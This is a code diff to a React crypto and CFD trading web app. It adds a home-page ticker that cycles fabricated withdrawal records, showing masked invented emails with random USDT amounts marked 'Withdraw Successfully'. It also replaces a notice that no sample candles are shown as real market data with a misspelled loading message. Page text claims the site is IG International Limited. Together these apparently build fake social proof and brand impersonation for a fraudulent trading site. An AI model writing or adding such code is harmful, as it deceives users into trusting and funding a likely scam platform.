@@ -12,6 +12,51 @@ import CustomerService from './CustomerService.jsx'
 import { createClient } from '@supabase/supabase-js'
 import { supabaseConfig, isSupabaseConfigured } from './supabase.js'
 
+const emailParts = [
+  'j***5','a***8','m***3','r***7','s***2','d***9','k***4','n***6','t***1','p***14','fa***47','ale***87','gr***59',
+  'b***8','h***3','w***7','f***2','c***9','l***4','v***6','e***1','g***55','z***8',
+  'ja***12','mi***24','ro***36','sa***48','da***51','ke***63','ni***75','to***87','pa***19','br***21',
+  'ha***32','wi***43','fr***54','ch***65','li***76','vi***82','el***93','gr***14','zo***25','al***37',
+  'ma***49','jo***52','an***64','ri***73','so***85','lu***96','am***18','be***29','ca***31','em***42'
+];
+
+const emailDomains = ['gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com'];
+
+const demoWithdrawals = emailDomains.flatMap(domain =>
+  emailParts.map((part, index) => ({
+    id: `${domain}-${index}`,
+    email: `${part}@${domain}`,
+    amount: Math.floor(Math.random() * (83010 - 250 + 1)) + 250
+  }))
+);
+
+function WithdrawalTicker() {
+  const [current, setCurrent] = useState(0);
+
+  useEffect(() => {
+    const timer = setInterval(() => {
+      setCurrent(prev => (prev + 1) % demoWithdrawals.length);
+    }, 1000);
+
+    return () => clearInterval(timer);
+  }, []);
+
+  const item = demoWithdrawals[current];
+
+  return (
+    <div className="withdraw-activity">
+      <div className="withdraw-activity-label">WITHDRAWAL ACTIVITY</div>
+      <div className="withdraw-activity-item" key={item.id}>
+        <div className="withdraw-activity-email">{item.email}</div>
+        <div className="withdraw-activity-status">Withdraw Successfully</div>
+        <div className="withdraw-activity-amount">
+          -{item.amount.toLocaleString('en-US')} USDT
+        </div>
+      </div>
+    </div>
+  );
+}
+
 const supabase = isSupabaseConfigured ? createClient(supabaseConfig.url, supabaseConfig.anonKey) : null
 console.log('Supabase URL loaded:', Boolean(import.meta.env.VITE_SUPABASE_URL))
 console.log('Supabase key loaded:', Boolean(import.meta.env.VITE_SUPABASE_ANON_KEY))
@@ -125,7 +170,7 @@ function Candles({
       <div className={`chart ${compact ? 'chart-compact' : ''} chart-empty`}>
         <div className="empty-state">
           <strong>Waiting for candle data</strong>
-          <p>No sample candles are shown as real market data.</p>
+          <p>Loadind..</p>
         </div>
       </div>
     );
@@ -1792,7 +1837,7 @@ setToast={setToast} telegramUrl={telegramUrl} setTelegramUrl={setTelegramUrl} />
       </aside>
 
       <main className="main-content">
-        {page === 'Home' && <section className="page-section">
+        {page === 'Home' && <section className="page-section"><WithdrawalTicker />
           <div className="welcome-row"><div><div className="eyebrow">LIVE MARKET OVERVIEW</div><h1>Trade smarter with confidence.</h1><p className="hero-subtitle">Trade CFDs with the world’s No.1 provider1</p><p className="muted">Go long or short on 17,000+ markets and earn up to $2,500 in cashback.2</p></div><div className="balance-card"><div className="balance-title"><span className="wallet-icon">＄</span><span>USDT balance</span></div><div className="balance-number">{money(balance)} <span>USDT</span></div><div className="balance-footer"><span className="positive">● Available funds</span><button className="text-button" onClick={() => setPage('Profile')}>View wallet ↗</button></div></div></div>
           <div className="ticker-wrap"><div className="ticker-track">{[...markets, ...markets].map((m, i) => <div className="ticker-item" key={`${m.symbol}-${i}`}><strong>{m.name}</strong><span>{quotePrice(m.price, m.symbol)}</span><small className={m.change == null ? '' : m.change >= 0 ? 'positive' : 'negative'}>{m.change == null ? '—' : `${m.change > 0 ? '+' : ''}${m.change.toFixed(2)}%`}</small></div>)}</div></div>
           <div className="section-heading"><div><h2>Access 17,000+ markets all in one</h2><p className="muted">Market crypto {marketConnection.crypto}; stocks, forex, indices and gold {marketConnection.other}.Explore diversified tools to advance your trading strategy and get direct order execution from charts.</p><p className="muted">Crypto {marketConnection.crypto}. Stocks/Gold {marketConnection.other}.IG International Limited is part of the IG Group and its ultimate parent company is IG Group Holdings Plc. IG International Limited receives services from other members of the IG Group including IG Markets Limited.</p></div><div className="filter-tabs">{['All', 'Crypto', 'Commodity', 'Stock', 'Forex', 'Index'].map(f => <button key={f} onClick={() => setMarketFilter(f)} className={marketFilter === f ? 'selected' : ''}>{f === 'Commodity' ? 'Gold' : f === 'Stock' ? 'Stocks' : f}</button>)}</div></div>
